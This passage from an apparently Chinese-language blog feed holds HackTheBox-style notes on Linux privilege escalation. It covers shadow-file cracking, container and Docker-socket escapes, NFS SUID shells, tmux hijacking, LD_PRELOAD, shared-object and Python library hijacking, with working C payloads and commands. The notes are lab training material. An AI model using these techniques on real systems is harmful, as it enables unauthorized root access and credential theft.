Format</h4><table><thead><tr><th><code>cry0l1t3</code></th><th><code>:</code></th><th><code>$6$wBRzy$...SNIP...x9cDWUxW1</code></th><th><code>:</code></th><th><code>18937</code></th><th><code>:</code></th><th><code>0</code></th><th><code>:</code></th><th><code>99999</code></th><th><code>:</code></th><th><code>7</code></th><th><code>:</code></th><th><code>:</code></th><th><code>:</code></th></tr></thead><tbody><tr><td>Username</td><td></td><td>Encrypted password</td><td></td><td>Last PW change</td><td></td><td>Min. PW age</td><td></td><td>Max. PW age</td><td></td><td>Warning period</td><td>Inactivity period</td><td>Expiration date</td><td></td></tr></tbody></table><h2 id="Cracking-Linux-Credentials"><a href="#Cracking-Linux-Credentials" class="headerlink" title="Cracking Linux Credentials"></a>Cracking Linux Credentials</h2><h4 id="Unshadow"><a href="#Unshadow" class="headerlink" title="Unshadow"></a>Unshadow</h4><p><code>unshadow</code>: 这是一个系统管理工具，用于合并 <code>/etc/passwd</code> 和 <code>/etc/shadow</code> 文件，并输出未加密的密码哈希值。</p><pre><code class="shell-session">Tanin@htb[/htb]$ sudo cp /etc/passwd /tmp/passwd.bak Tanin@htb[/htb]$ sudo cp /etc/shadow /tmp/shadow.bak Tanin@htb[/htb]$ unshadow /tmp/passwd.bak /tmp/shadow.bak &gt; /tmp/unshadowed.hashes</code></pre><h4 id="Hashcat-Cracking-Unshadowed-Hashes"><a href="#Hashcat-Cracking-Unshadowed-Hashes" class="headerlink" title="Hashcat - Cracking Unshadowed Hashes"></a>Hashcat - Cracking Unshadowed Hashes</h4>]]></content>
    
    
    <summary type="html">&lt;p&gt;在我们的渗透测试中，我们遇到的每一个计算机网络都将安装用于管理、编辑或创建内容的服务。所有这些服务都使用特定的权限托管，并分配给特定的用户&lt;/p&gt;</summary>
    
    
    
    
    <category term="base" scheme="https://taninluv.github.io/tags/base/"/>
    
  </entry>
  
  <entry>
    <title>Linux_Privilege_Escalation3</title>
    <link href="https://taninluv.github.io/2023/07/17/Linux-Privilege-Escalation3/"/>
    <id>https://taninluv.github.io/2023/07/17/Linux-Privilege-Escalation3/</id>
    <published>2023-07-17T03:11:30.000Z</published>
    <updated>2023-07-18T05:46:48.153Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Containers"><a href="#Containers" class="headerlink" title="Containers"></a>Containers</h1><p>容器在操作系统级别操作，虚拟机在硬件级别操作。因此，容器共享一个操作系统，并将应用程序进程与系统的其他部分隔离开来，而经典的虚拟化允许多个操作系统在单个系统上同时运行。 隔离和虚拟化至关重要，因为它们有助于尽可能高效地管理资源和安全方面。例如，它们有助于监测系统中的错误，这些错误通常与新开发的应用程序无关。另一个例子是隔离通常需要root权限的进程。此类应用程序可以是web应用程序或API，必须与主机系统隔离，以防止升级到数据库。</p><span id="more"></span><h2 id="Linux-Containers"><a href="#Linux-Containers" class="headerlink" title="Linux Containers"></a>Linux Containers</h2><p>Linux容器（LXC）是一种操作系统级的虚拟化技术，它允许多个Linux系统通过拥有自己的进程但共享主机系统内核而在单个主机上彼此隔离运行。</p><h4 id="Linux-Daemon"><a href="#Linux-Daemon" class="headerlink" title="Linux Daemon"></a>Linux Daemon</h4><p><a href="https://github.com/lxc/lxd">LXD</a>在某些方面与之相似，但其设计目的是包含一个完整的操作系统。因此，它不是一个应用程序容器，而是一个系统容器。在我们可以使用此服务升级我们的权限之前，我们必须在lxc或lxd组中。</p><p>从现在开始，我们有几种方法可以利用LXC&#x2F;LXD。我们可以创建自己的容器并将其传输到目标系统，也可以使用现有的容器。不幸的是，管理员经常使用几乎没有安全性的模板。这种态度的后果是，我们已经有了可以自己用来对付这个系统的工具。</p><pre><code class="shell-session">container-user@nix02:~$ cd ContainerImagescontainer-user@nix02:~$ lsubuntu-template.tar.xz</code></pre><p>这样的模板通常没有密码，特别是如果它们是简单的测试环境。这些应该可以快速访问并且使用起来不复杂。对安全的关注将使整个启动过程复杂化，使其更加困难，从而大大减缓启动速度。如果我们有点幸运，并且系统上有这样一个容器，它可以被利用。为此，我们需要将此容器作为镜像导入。</p><pre><code class="shell-session">container-user@nix02:~$ lxc image import ubuntu-template.tar.xz --alias ubuntutempcontainer-user@nix02:~$ lxc image list</code></pre><p>在验证此映像已成功导入后，我们可以启动映像并通过指定容器的security.privileged标志和根路径对其进行配置。此标志将禁用允许我们对主机执行操作的所有隔离功能。</p><pre><code class="shell-session">container-user@nix02:~$ lxc init ubuntutemp privesc -c security.privileged=truecontainer-user@nix02:~$ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true</code></pre><blockquote><ol><li><code>lxc init ubuntutemp privesc -c security.privileged=true</code><ul><li><code>lxc init</code>: 创建一个新的容器配置。</li><li><code>ubuntutemp</code>: 源容器的名称。在此命令中，<code>ubuntutemp</code> 是已存在的容器的名称，将作为基础来创建新的容器。</li><li><code>privesc</code>: 新容器的名称。在这里，<code>privesc</code> 是要创建的新容器的名称。</li><li><code>-c security.privileged=true</code>: 这个选项用于将新创建的容器标记为 “特权容器”，即赋予它在主机系统上访问某些特权功能的能力。</li></ul></li><li><code>lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true</code><ul><li><code>lxc config device add</code>: 向容器配置中添加设备。</li><li><code>privesc</code>: 容器的名称，这里是之前创建的名为 <code>privesc</code> 的容器。</li><li><code>host-root</code>: 新设备的名称，这里是自定义的名称，表示要添加到容器中的设备的名称。</li><li><code>disk</code>: 设备类型，这里是要添加的设备类型是磁盘。</li><li><code>source=/</code>: 设备的源路径，这里指定的是 <code>/</code>，表示要将主机系统的根目录挂载到容器中。</li><li><code>path=/mnt/root</code>: 设备的目标路径，这里指定的是 <code>/mnt/root</code>，表示将主机系统的根目录挂载到容器中的 <code>/mnt/root</code> 目录。</li><li><code>recursive=true</code>: 指定递归地挂载整个文件系统。</li></ul></li></ol></blockquote><p>完成后，我们可以启动容器并登录到其中。在容器中，我们可以转到指定的路径，以root身份访问主机系统的资源。</p><pre><code class="shell-session">container-user@nix02:~$ lxc start privesccontainer-user@nix02:~$ lxc exec privesc /bin/bashroot@nix02:~# ls -l /mnt/root</code></pre><h2 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h2><p>要通过Docker获得root权限，我们登录的用户必须在Docker组中。这使他能够使用和控制Docker守护进程。</p><p>或者，Docker可能设置了SUID，或者我们在Sudoers文件中，这允许我们以root身份运行Docker。这三个选项都允许我们与Docker合作以提升我们的特权。 大多数主机都有直接的互联网连接，因为必须下载基本映像和容器。然而，出于安全原因，许多主机可能在夜间和工作时间以外与互联网断开连接。然而，如果这些主机位于网络中，例如，web服务器必须通过该网络，则仍然可以访问该网络。 要查看存在哪些镜像以及我们可以访问哪些镜像，我们可以使用以下命令：</p><h4 id="Linux-Docker"><a href="#Linux-Docker" class="headerlink" title="Linux Docker"></a>Linux Docker</h4><pre><code class="shell-session">docker-user@nix02:~$ docker image lsREPOSITORY                           TAG                 IMAGE ID       CREATED         SIZEubuntu                               20.04               20fffa419e3a   2 days ago    72.8MB</code></pre><h4 id="Docker-Socket"><a href="#Docker-Socket" class="headerlink" title="Docker Socket"></a>Docker Socket</h4><p>当Docker套接字是可写的时，也可能发生这种情况。通常这个套接字位于&#x2F;var&#x2F;run&#x2F;doker.sock.但是，可以理解的是，位置不同。因为基本上，这只能由root或docker组编写。如果我们作为不在这两个组中的用户，并且Docker套接字仍然具有可写的权限，那么我们仍然可以使用这种情况来升级我们的权限。</p><pre><code class="shell-session">docker-user@nix02:~$ docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bashroot@ubuntu:~# ls -l /mnt</code></pre><blockquote><p>该命令使用 Docker 在容器中运行 Ubuntu 镜像，并将宿主机根目录 <code>/</code> 挂载到容器内的 <code>/mnt</code> 目录，然后进入容器的 Bash shell。</p><p>解析该命令的各个部分：</p><ul><li><code>docker</code>：Docker 命令，用于管理容器和镜像。</li><li><code>-H unix:///var/run/docker.sock</code>：指定 Docker 的主机地址，这里是 Unix 域套接字地址，用于与 Docker 守护进程通信。</li><li><code>run</code>：Docker 命令，用于创建并运行一个新的容器。</li><li><code>-v /:/mnt</code>：指定容器的数据卷挂载，将宿主机根目录 <code>/</code> 挂载到容器内的 <code>/mnt</code> 目录。这样在容器中可以访问宿主机的整个文件系统。</li><li><code>--rm</code>：指定容器退出时自动删除容器。当容器退出后，自动清理容器的数据。</li><li><code>-it</code>：启用交互式模式并分配一个伪终端 (pseudo-TTY)。这样可以进入容器并与其交互。</li><li><code>ubuntu</code>：要运行的容器镜像，这里是 Ubuntu 镜像。</li><li><code>chroot /mnt bash</code>：在容器内运行的命令，这里是 <code>chroot</code> 命令切换根目录到 <code>/mnt</code> 目录，然后启动 Bash shell。</li></ul></blockquote><h1 id="Miscellaneous-Techniques"><a href="#Miscellaneous-Techniques" class="headerlink" title="Miscellaneous Techniques"></a>Miscellaneous Techniques</h1><h2 id="Weak-NFS-Privileges"><a href="#Weak-NFS-Privileges" class="headerlink" title="Weak NFS Privileges"></a>Weak NFS Privileges</h2><p>网络文件系统（NFS）允许用户通过Unix&#x2F;Linux系统上托管的网络访问共享文件或目录。NFS使用TCP&#x2F;UDP端口2049。任何可访问的装载都可以通过发出命令showmount-e远程列出，该命令列出NFS客户端的NFS服务器的导出列表（或文件系统的访问控制列表）。</p><pre><code class="shell-session">Tanin@htb[/htb]$ showmount -e 10.129.2.12Export list for 10.129.2.12:/tmp             */var/nfs/general *</code></pre><p>创建NFS卷时，可以设置各种选项： </p><p>root_squash： 如果root用户用于访问NFS共享，它将被更改为nfsnobody用户，这是一个没有特权的帐户。root用户创建和上传的任何文件都将归nfsnobody用户所有，这可以防止攻击者上传SUID位设置的二进制文件。</p><p> no_root_squash：作为本地根用户连接到共享的远程用户将能够作为根用户在NFS服务器上创建文件。这将允许创建具有SUID位集的恶意脚本&#x2F;程序。</p><pre><code class="shell-session">htb@NIX02:~$ cat /etc/exports# /etc/exports: the access control list for filesystems which may be exported#to NFS clients.  See exports(5).## Example for NFSv2 and NFSv3:# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)## Example for NFSv4:# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)#/var/nfs/general *(rw,no_root_squash)/tmp *(rw,no_root_squash)</code></pre><p>例如，我们可以创建一个SETUID二进制文件，使用本地根用户执行&#x2F;bin&#x2F;sh。然后，我们可以在本地装载&#x2F;tmp目录，将root拥有的二进制文件复制到NFS服务器，并设置SUID位。 首先，创建一个简单的二进制文件，在本地装载目录，复制它，并设置必要的权限。</p><pre><code class="shell-session">htb@NIX02:~$ cat shell.c #include &lt;stdio.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;int main(void)&#123;  setuid(0); setgid(0); system(&quot;/bin/bash&quot;);&#125;</code></pre><pre><code class="shell-session">htb@NIX02:/tmp$ gcc shell.c -o shell</code></pre><pre><code class="shell-session">root@Pwnbox:~$ sudo mount -t nfs 10.129.2.12:/tmp /mntroot@Pwnbox:~$ cp shell /mntroot@Pwnbox:~$ chmod u+s /mnt/shell</code></pre><pre><code class="shell-session">root@Pwnbox:~$ sudo mount -t nfs 10.129.2.12:/tmp /mntroot@Pwnbox:~$ cp shell /mntroot@Pwnbox:~$ chmod u+s /mnt/shell</code></pre><pre><code class="shell-session">htb@NIX02:/tmp$ ./shellroot@NIX02:/tmp# iduid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare),1000(htb)</code></pre><h2 id="Hijacking-Tmux-Sessions"><a href="#Hijacking-Tmux-Sessions" class="headerlink" title="Hijacking Tmux Sessions"></a>Hijacking Tmux Sessions</h2><p>诸如 <a href="https://en.wikipedia.org/wiki/Tmux">tmux</a>之类的终端多路复用器可以用于允许在单个控制台会话内访问多个终端会话。当不在tmux窗口中工作时，我们可以从会话分离，仍然保持它处于活动状态（即，运行nmap扫描）。由于许多原因，用户可能会让tmux进程以特权用户的身份运行，例如使用弱权限设置的root，并可能被劫持。这可以通过以下命令来完成，以创建新的共享会话并修改所有权。</p><pre><code class="shell-session">htb@NIX02:~$ tmux -S /shareds new -s debugsesshtb@NIX02:~$ chown root:devs /shareds</code></pre><blockquote><ol><li><p><code>tmux -S /shareds new -s debugsess</code>：这个命令用于创建一个新的 tmux 会话，并将会话的控制 socket（控制 socket 用于与会话通信）设置为 <code>/shareds</code> 目录下的 <code>debugsess</code> 文件。<code>tmux</code> 是一个终端复用工具，允许用户在单个终端窗口中创建多个会话，并在会话之间切换。</p></li><li><p><code>chown root:devs /shareds</code>：这个命令用于更改 <code>/shareds</code> 目录的所有者和所属组。<code>chown</code> 是 Linux 中用于修改文件或目录所有者和所属组的命令。在这里，将 <code>/shareds</code> 目录的所有者设置为 <code>root</code> 用户，所属组设置为 <code>devs</code> 组。</p></li><li><p>设置 <code>/shareds</code> 目录的所属组为 <code>devs</code> 组后，该目录的成员将具有与所有者 <code>root</code> 相同的访问权限。这是因为在 Linux 系统中，文件和目录的权限由三种身份来控制：所有者、所属组和其他用户。</p><p>在这种设置下，<code>root</code> 用户是 <code>/shareds</code> 目录的所有者，而 <code>devs</code> 组是该目录的所属组。Linux 文件系统中的文件和目录权限分为读取（r）、写入（w）和执行（x）权限，可以针对所有者、所属组和其他用户分别设置。</p><p>由于 <code>root</code> 是 <code>/shareds</code> 目录的所有者，因此 <code>root</code> 用户将拥有所有权限，即读取、写入和执行权限。</p><p>同时，由于 <code>devs</code> 组是 <code>/shareds</code> 目录的所属组，并且设置了 <code>chown root:devs /shareds</code>，因此 <code>devs</code> 组的成员将拥有与所有者 <code>root</code> 相同的权限。这意味着 <code>devs</code> 组的成员可以读取、写入和执行 <code>/shareds</code> 目录及其内部的文件。</p></li></ol></blockquote><p>如果我们可以危害dev组中的用户，我们可以连接到此会话并获得root访问权限。 检查是否有任何正在运行的tmux进程。</p><pre><code class="shell-session">htb@NIX02:~$  ps aux | grep tmuxroot      4806  0.0  0.1  29416  3204 ?        Ss   06:27   0:00 tmux -S /shareds new -s debugsess</code></pre><p>确认权限。</p><pre><code class="shell-session">htb@NIX02:~$ ls -la /shareds srw-rw---- 1 root devs 0 Sep  1 06:27 /shareds</code></pre><pre><code class="shell-session">htb@NIX02:~$ iduid=1000(htb) gid=1000(htb) groups=1000(htb),1011(devs)</code></pre><pre><code class="shell-session">htb@NIX02:~$ tmux -S /sharedsiduid=0(root) gid=0(root) groups=0(root)</code></pre><h1 id="Shared-Libraries"><a href="#Shared-Libraries" class="headerlink" title="Shared Libraries"></a>Shared Libraries</h1><p>Linux程序通常使用动态链接的共享对象库。库包含已编译的代码或其他数据，开发人员使用这些数据来避免在多个程序中重写相同的代码。Linux中存在两种类型的库：静态库（用.a文件扩展名表示）和动态链接的共享对象库（用.so文件扩展名指示）。编译程序时，静态库将成为程序的一部分，并且不能更改。但是，可以修改动态库来控制调用它们的程序的执行。 有多种方法可以指定动态库的位置，因此系统将知道在程序执行时在哪里查找它们。这包括编译程序时的-rpath或-rpath链接标志，使用环境变量LD_RUN_PATH或LD_LIBRARY_PATH，将库放置在&#x2F;lib或&#x2F;usr&#x2F;lib默认目录中，或在&#x2F;etc&#x2F;LD.so.conf配置文件中指定另一个包含库的目录。 此外，LD_PRELOAD环境变量可以在执行二进制文件之前加载库。该库中的函数优先于默认函数。二进制文件所需的共享对象可以使用ldd实用程序查看。</p><pre><code class="shell-session">htb_student@NIX02:~$ ldd /bin/ls    linux-vdso.so.1 =&gt;  (0x00007fff03bc7000)    libselinux.so.1 =&gt; /lib/x86_64-linux-gnu/libselinux.so.1 (0x00007f4186288000)    libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f4185ebe000)    libpcre.so.3 =&gt; /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f4185c4e000)    libdl.so.2 =&gt; /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f4185a4a000)    /lib64/ld-linux-x86-64.so.2 (0x00007f41864aa000)    libpthread.so.0 =&gt; /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f418582d000)</code></pre><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdlib.h&gt;void _init() &#123;unsetenv(&quot;LD_PRELOAD&quot;);setgid(0);setuid(0);system(&quot;/bin/bash&quot;);&#125;</code></pre><p>我们可以将其编译如下：</p><pre><code class="shell-session">htb_student@NIX02:~$ gcc -fPIC -shared -o root.so root.c -nostartfiles</code></pre><blockquote><ol><li><code>gcc</code>: GCC（GNU Compiler Collection）是一个流行的编译器套件，用于编译 C、C++ 等编程语言的源代码。</li><li><code>-fPIC</code>: 这个选项告诉编译器生成位置无关代码（Position Independent Code，PIC），这样编译的共享库可以在内存中的任意位置加载，有助于共享库在不同进程之间共享代码段。</li><li><code>-shared</code>: 这个选项告诉编译器生成共享库而不是可执行文件。</li><li><code>-o root.so</code>: 这个选项指定输出的文件名为 <code>root.so</code>，即编译生成的共享库的文件名。</li><li><code>root.c</code>: 这是输入的源代码文件名，这里假设 <code>root.c</code> 是包含共享库的 C 代码文件。</li><li><code>-nostartfiles</code>: 这个选项告诉编译器不使用标准启动文件，通常用于生成不依赖标准 C 库的共享库。</li></ol></blockquote><p>最后，我们可以使用以下命令升级权限。请确保指定恶意库文件的完整路径。</p><pre><code class="shell-session">htb_student@NIX02:~$ sudo LD_PRELOAD=/tmp/root.so 【Privilege command】iduid=0(root) gid=0(root) groups=0(root)</code></pre><p>补充一下：</p><blockquote><p>查看系统中是否有命令使用了 <code>LD_PRELOAD</code> 可能比较复杂，因为 <code>LD_PRELOAD</code> 是一个环境变量，可以在各种脚本、配置文件或命令中设置，甚至在程序运行时通过 <code>dlopen()</code> 等函数动态加载共享库。</p><p>以下是一些可能使用 <code>LD_PRELOAD</code> 的常见命令或程序：</p><ol><li><p><code>ldd</code>: <code>ldd</code> 命令本身会使用 <code>LD_PRELOAD</code> 来查找程序所依赖的共享库。</p></li><li><p>动态链接的程序：那些使用动态链接的程序，如自己编写的程序、第三方程序或系统工具，可能在启动时使用了 <code>LD_PRELOAD</code> 来预加载共享库。</p></li><li><p>启动脚本或配置文件：有些应用程序的启动脚本或配置文件中可能设置了 <code>LD_PRELOAD</code> 环境变量。</p></li><li><p>调试工具：一些调试工具可能使用 <code>LD_PRELOAD</code> 来注入共享库，从而实现调试目标程序。</p></li><li><p>系统设置：在某些情况下，系统级别的设置或安全策略可能设置了全局的 <code>LD_PRELOAD</code>，从而影响所有程序的运行。</p></li></ol><p>要查找系统中所有使用了 <code>LD_PRELOAD</code> 的命令，您可以使用以下方法：</p><ol><li><p>使用 <code>grep</code> 命令：在系统目录和用户目录中查找包含 <code>LD_PRELOAD</code> 的文件。例如：</p><pre><code class="bash">grep -rnw &#39;/&#39; -e &quot;LD_PRELOAD&quot;</code></pre><p>这会在整个系统中递归地查找包含 <code>LD_PRELOAD</code> 的文件，并列出相应的行和文件名。</p></li><li><p>使用 <code>ps</code> 命令：查看当前正在运行的进程中是否有使用了 <code>LD_PRELOAD</code> 的程序。例如：</p><pre><code class="bash">ps -eo pid,args | grep &quot;LD_PRELOAD&quot;</code></pre><p>这会列出当前正在运行的进程中包含 <code>LD_PRELOAD</code> 的命令行。</p></li></ol><p>请注意，找到使用 <code>LD_PRELOAD</code> 的命令并不意味着它们一定是恶意的或具有安全风险的。某些合法的程序可能需要使用 <code>LD_PRELOAD</code> 来实现特定功能或调试需求。然而，在生产环境中，对于未知来源或未经验证的 <code>LD_PRELOAD</code> 设置需要谨慎处理，以确保系统安全。</p></blockquote><h1 id="Shared-Object-Hijacking"><a href="#Shared-Object-Hijacking" class="headerlink" title="Shared Object Hijacking"></a>Shared Object Hijacking</h1><p>正在开发的程序和二进制文件通常具有与其相关联的自定义库。请考虑以下SETUID二进制文件。</p><pre><code class="shell-session">htb_student@NIX02:~$ ls -la payroll-rwsr-xr-x 1 root root 16728 Sep  1 22:05 payroll</code></pre><p>我们可以使用ldd来打印二进制或共享对象所需的共享对象。对于程序的每个依赖项，Ldd显示对象的位置和加载到内存中的十六进制地址。</p><pre><code class="shell-session">htb_student@NIX02:~$ ldd payrolllinux-vdso.so.1 =&gt;  (0x00007ffcb3133000)libshared.so =&gt; /lib/x86_64-linux-gnu/libshared.so (0x00007f7f62e51000)libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f7f62876000)/lib64/ld-linux-x86-64.so.2 (0x00007f7f62c40000)</code></pre><p>我们看到一个名为libshared.so的非标准库被列为二进制文件的依赖项。如前所述，可以从自定义位置加载共享库。一个这样的设置是RUNPATH配置。此文件夹中的库优先于其他文件夹。这可以使用<a href="https://man7.org/linux/man-pages/man1/readelf.1.html">readelf</a> 实用程序进行检查。</p><pre><code class="shell-session">htb_student@NIX02:~$ readelf -d payroll  | grep PATH 0x000000000000001d (RUNPATH)            Library runpath: [/development]</code></pre><p>该配置允许从&#x2F;development文件夹加载库，该文件夹可由所有用户写入。此错误配置可通过在&#x2F;development中放置恶意库来利用，该库将优先于其他文件夹，因为首先检查此文件中的条目（在配置文件中存在其他文件夹之前）。</p><pre><code class="shell-session">htb_student@NIX02:~$ ls -la /development/total 8drwxrwxrwx  2 root root 4096 Sep  1 22:06 ./drwxr-xr-x 23 root root 4096 Sep  1 21:26 ../</code></pre><p>在编译库之前，我们需要找到二进制调用的函数名。</p><pre><code class="shell-session">htb_student@NIX02:~$ cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so</code></pre><pre><code class="shell-session">htb_student@NIX02:~$ ldd payrolllinux-vdso.so.1 (0x00007ffd22bbc000)libshared.so =&gt; /development/libshared.so (0x00007f0c13112000)/lib64/ld-linux-x86-64.so.2 (0x00007f0c1330a000)</code></pre><pre><code class="shell-session">htb_student@NIX02:~$ ./payroll ./payroll: symbol lookup error: ./payroll: undefined symbol: dbquery</code></pre><p>我们可以将现有库复制到开发文件夹中。对二进制文件运行ldd会将库的路径列为&#x2F;development&#x2F;libshared.so，这意味着它很容易受到攻击。执行二进制文件会引发一个错误，说明它找不到名为dbquery的函数。我们可以编译一个包含此函数的共享对象。</p><pre><code class="c">#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;void dbquery() &#123;    printf(&quot;Malicious library loaded\n&quot;);    setuid(0);    system(&quot;/bin/sh -p&quot;);&#125; </code></pre><p>dbquery函数将我们的用户id设置为0（root），并在调用时执行&#x2F;bin&#x2F;sh。使用GCC进行编译。</p><pre><code class="shell-session">htb_student@NIX02:~$ gcc src.c -fPIC -shared -o /development/libshared.so</code></pre><pre><code class="shell-session">htb_student@NIX02:~$ ./payroll ***************Inlane Freight Employee Database***************Malicious library loaded# iduid=0(root) gid=1000(mrb3n) groups=1000(mrb3n)</code></pre><h1 id="Python-Library-Hijacking"><a href="#Python-Library-Hijacking" class="headerlink" title="Python Library Hijacking"></a>Python Library Hijacking</h1><p>我们可以通过多种方式劫持Python库。这在很大程度上取决于剧本及其内容本身。但是，有三个基本漏洞可以用来进行劫持： </p><ul><li>写入权限错误 </li><li>库路径 </li><li>PYTHONPATH环境变量</li></ul><h2 id="Wrong-Write-Permissions"><a href="#Wrong-Write-Permissions" class="headerlink" title="Wrong Write Permissions"></a>Wrong Write Permissions</h2><p>例如，我们可以想象我们在公司内部网上的一个开发人员的主机上，而开发人员正在使用python。所以我们总共有三个组件是相连的。这是导入python模块的实际python脚本、脚本的权限以及模块的权限。 一个或另一个python模块可能错误地为所有用户设置了写入权限。这允许对python模块进行编辑和操作，以便我们可以插入将产生我们想要的结果的命令或函数。如果SUID&#x2F;SGID权限已分配给导入此模块的Python脚本，我们的代码将自动包含在内。 如果我们查看mem_stats.py脚本的设置权限，我们可以看到它有一个SUID集。</p><pre><code class="shell-session">htb-student@lpenix:~$ ls -l mem_stats.py-rwsrwxr-x 1 root mrb3n 188 Dec 13 20:13 mem_stats.py</code></pre><p>因此，我们可以使用另一个用户（在我们的案例中，作为root用户）的权限来执行此脚本。我们还拥有查看脚本和阅读其内容的权限。</p><h4 id="Python-Script-Contents"><a href="#Python-Script-Contents" class="headerlink" title="Python Script - Contents"></a>Python Script - Contents</h4><pre><code class="python">#!/usr/bin/env python3import psutilavailable_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().totalprint(f&quot;Available memory: &#123;round(available_memory, 2)&#125;%&quot;)</code></pre><p>所以这个脚本非常简单，只显示可用虚拟内存的百分比。我们还可以在第二行中看到，该脚本导入模块psutil并使用函数virtual_memory（）。 因此，我们可以在psutil的文件夹中查找此函数，并检查此模块是否具有写入权限。 </p><h4 id="Module-Permissions"><a href="#Module-Permissions" class="headerlink" title="Module Permissions"></a>Module Permissions</h4><pre><code class="shell-session">htb-student@lpenix:~$ grep -r &quot;def virtual_memory&quot; /usr/local/lib/python3.8/dist-packages/psutil/*/usr/local/lib/python3.8/dist-packages/psutil/__init__.py:def virtual_memory():/usr/local/lib/python3.8/dist-packages/psutil/_psaix.py:def virtual_memory():/usr/local/lib/python3.8/dist-packages/psutil/_psbsd.py:def virtual_memory():/usr/local/lib/python3.8/dist-packages/psutil/_pslinux.py:def virtual_memory():/usr/local/lib/python3.8/dist-packages/psutil/_psosx.py:def virtual_memory():/usr/local/lib/python3.8/dist-packages/psutil/_pssunos.py:def virtual_memory():/usr/local/lib/python3.8/dist-packages/psutil/_pswindows.py:def virtual_memory():htb-student@lpenix:~$ ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py-rw-r--rw- 1 root staff 87339 Dec 13 20:07 /usr/local/lib/python3.8/dist-packages/psutil/__init__.py</code></pre><p>这种权限在许多开发人员使用不同脚本的开发人员环境中最为常见，并且可能需要更高的权限。</p><h4 id="Module-Contents"><a href="#Module-Contents" class="headerlink" title="Module Contents"></a>Module Contents</h4><pre><code class="python">...SNIP...def virtual_memory():    ...SNIP...        global _TOTAL_PHYMEM    ret = _psplatform.virtual_memory()    # cached for later use in Process.memory_percent()    _TOTAL_PHYMEM = ret.total    return ret...SNIP...</code></pre><p>这是库中我们可以插入代码的部分。建议将其放在函数的开头。在那里，我们可以插入我们认为正确和有效的一切。我们可以出于测试目的导入模块操作系统，这使我们能够执行系统命令。这样，我们就可以插入命令id，并在脚本执行期间检查插入的代码是否执行。</p><pre><code class="python">...SNIP...def virtual_memory():    ...SNIP...    #### Hijacking    import os    os.system(&#39;id&#39;)        global _TOTAL_PHYMEM    ret = _psplatform.virtual_memory()    # cached for later use in Process.memory_percent()    _TOTAL_PHYMEM = ret.total    return ret...SNIP...</code></pre><h4 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h4><pre><code class="shell-session">htb-student@lpenix:~$ sudo /usr/bin/python3 ./mem_status.pyuid=0(root) gid=0(root) groups=0(root)uid=0(root) gid=0(root) groups=0(root)Available memory: 79.22%</code></pre><p>成功正如我们从上面的结果中看到的那样，我们成功地劫持了库，并使virtual_memory（）函数中的代码以root身份运行。现在我们已经得到了所需的结果，我们可以再次编辑库，但这一次，插入一个以root身份连接到主机的反向shell。</p><h2 id="Library-Path"><a href="#Library-Path" class="headerlink" title="Library Path"></a>Library Path</h2><p>在Python中，每个版本都有指定的搜索和导入库（模块）的顺序。Python从中导入模块的顺序基于优先级系统，这意味着列表中较高的路径优先于列表中较低的路径。我们可以通过发出以下命令来看到这一点：</p><pre><code class="shell-session">htb-student@lpenix:~$ python3 -c &#39;import sys; print(&quot;\n&quot;.join(sys.path))&#39;/usr/lib/python38.zip/usr/lib/python3.8/usr/lib/python3.8/lib-dynload/usr/local/lib/python3.8/dist-packages/usr/lib/python3/dist-packages</code></pre><p>为了能够使用这个变体，两个先决条件是必要的。 脚本导入的模块位于通过PYTHONPATH变量列出的一个优先级较低的路径下。 我们必须对列表中优先级较高的路径之一具有写入权限。</p><p>因此，如果导入的模块位于列表中较低的路径中，并且较高优先级的路径可由我们的用户编辑，我们可以自己创建一个具有相同名称的模块，并包含我们自己想要的功能。由于优先级较高的路径会更早读取并检查有问题的模块，因此Python会访问它找到的第一个命中，并在到达原始和预期模块之前将其导入。 为了让这一点更有意义，让我们继续前面的例子，并展示如何利用这一点。以前，psutil模块被导入到mem_stats.py脚本中。我们可以通过发出以下命令来查看psutil的默认安装位置：</p><h4 id="Psutil-Default-Installation-Location"><a href="#Psutil-Default-Installation-Location" class="headerlink" title="Psutil Default Installation Location"></a>Psutil Default Installation Location</h4><pre><code class="shell-session">htb-student@lpenix:~$ pip3 show psutil...SNIP...Location: /usr/local/lib/python3.8/dist-packages...SNIP...</code></pre><p>从这个例子中，我们可以看到psutil安装在以下路径中：&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.8&#x2F;dist-packages。从我们之前列出的PYTHONPATH变量中，我们有合理数量的目录可供选择，以查看环境中是否存在任何错误配置，从而允许我们对其中任何目录进行写访问。让我们检查一下。</p><h4 id="Misconfigured-Directory-Permissions"><a href="#Misconfigured-Directory-Permissions" class="headerlink" title="Misconfigured Directory Permissions"></a>Misconfigured Directory Permissions</h4><pre><code class="shell-session">htb-student@lpenix:~$ ls -la /usr/lib/python3.8total 4916drwxr-xrwx 30 root root  20480 Dec 14 16:26 ....SNIP...</code></pre><p>在检查了列出的所有目录后，&#x2F;usr&#x2F;lib&#x2F;python3.8路径的配置似乎不正确，任何用户都可以对其进行写入。通过与PYTHONPATH变量中的值进行交叉检查，我们可以看到该路径在列表中的位置高于安装psutil的路径。让我们尝试滥用这种错误配置，在&#x2F;usr&#x2F;lib&#x2F;python3.8目录中创建我们自己的psutil模块，该模块包含我们自己的恶意virtual_memory（）函数。</p><h4 